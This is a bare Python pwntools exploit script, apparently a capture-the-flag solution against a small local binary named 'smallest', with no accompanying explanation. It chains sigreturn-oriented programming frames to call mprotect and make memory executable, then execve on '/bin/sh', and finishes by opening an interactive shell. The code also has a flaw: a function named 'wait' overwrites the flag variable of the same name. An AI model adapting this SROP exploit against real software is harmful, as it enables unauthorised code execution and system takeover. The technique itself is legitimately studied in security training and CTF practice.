from pwn import *
 
p = process("./smallest")
wait = 1
def  wait():
    if wait:
        raw_input('input')
    else:
        sleep(1)
def pwn():
 
    debug = 1
    if debug: gdb.attach(p)
    
    start_addr = 0x4000B0
    syscall_addr = 0x4000BE
    context.arch = "amd64"
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 10
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rsp = 0x400128
    frame.rip = syscall_addr
    payload = p64(start_addr) + p64(syscall_addr) + str(frame)
    p.sendline(payload)
    #sleep(1)
    wait()

    payload = p64(syscall_addr)
    payload = payload.ljust(14,'a')
    p.sendline(payload)
    #sleep(1)
    wait()

    frame = SigreturnFrame(kernel="amd64")
    frame.r8 = 0x68732f6e69622f
    frame.rdi = 0x400130 + 8*2 + 8*5
    frame.rax = 59
    frame.rip = syscall_addr
    frame.rsp = 0x400128
    payload = p64(start_addr) + p64(syscall_addr) + str(frame)
    p.sendline(payload)
    #sleep(1)
    wait()

    payload = p64(syscall_addr)
    payload = payload.ljust(14,'a')
    p.sendline(payload)
    p.interactive()
 
pwn()
